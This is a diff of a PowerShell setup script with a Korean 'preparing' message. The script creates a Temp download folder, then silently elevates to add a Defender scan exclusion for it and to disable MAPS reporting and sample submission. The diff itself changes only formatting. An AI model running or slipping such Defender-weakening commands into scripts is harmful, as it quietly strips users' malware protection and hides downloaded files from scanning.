@@ -1,4 +1,4 @@
-﻿Write-Host "### 준비중" -ForegroundColor Green -NoNewline
+﻿Write-Host "`n### 준비중" -ForegroundColor Green -NoNewline
 
 $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
@@ -6,7 +6,7 @@ $Global:Temp = "$Env:Temp\Download"
 $null = New-Item -Path $Global:Temp -ItemType Directory -Force
 Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command", "
 Add-MpPreference -ExclusionPath `"$Global:Temp`" -Force
-Set-MpPreference -MAPSReporting Disabled -Force
+Set-MpPreference -MAPSReporting 0 -Force
 Set-MpPreference -SubmitSamplesConsent 2 -Force
 "
 
